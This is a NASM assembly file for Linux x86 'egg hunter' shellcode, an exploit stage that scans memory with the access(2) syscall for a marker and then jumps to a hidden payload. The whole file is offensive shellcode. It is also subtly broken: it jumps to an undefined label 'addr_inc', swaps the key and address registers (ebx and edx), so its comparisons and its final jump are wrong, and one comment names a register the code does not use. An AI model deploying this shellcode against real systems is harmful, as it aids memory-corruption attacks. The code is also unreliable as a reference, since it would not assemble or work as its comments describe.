; Filename: egghunter.nasm
; Author:   Jake
; Website:  http://github.com/14deep
; Purpose:  Egg Hunter shellcode using the access(2) syscall


global _start			

section .text
_start:

init:
	xor ecx, ecx ; value to be empty for syscall
	mul ecx      ; eax nulled
	mov ebx, 0x50905091 ; key to find + 1
	dec ebx      ; dec edx to = the key

addr_page:
	or dx, 0xfff ; 

incr:
	inc edx
	pusha        ; Push all general purpose registers to the stackto maintain state after syscall


mov al, 0x21 ; access(2) syscall value
int 0x80     ; Interupt for syscall


cmp al, 0xf2 ; Compare return value with 0xf2 - lowest byte of efault value 
popa         ; pop registers back from before syscall
jz short addr_inc ; If the zero flag is set, jump to addr_inc


cmp [ebx], edx ; Compare the contents of ebx with edx, the key
jnz short addr_inc ; If the values do not match a jump is taken to addr_inc


cmp [ebx+0x4], edx ; Compare the contents of ebx+0x4 to edx, the key
jnz short addr_inc ; If the values do not match a jump is taken to addr_inc


jmp ebx      ; unconditional jump to ebx, the confirmed location to continue execution
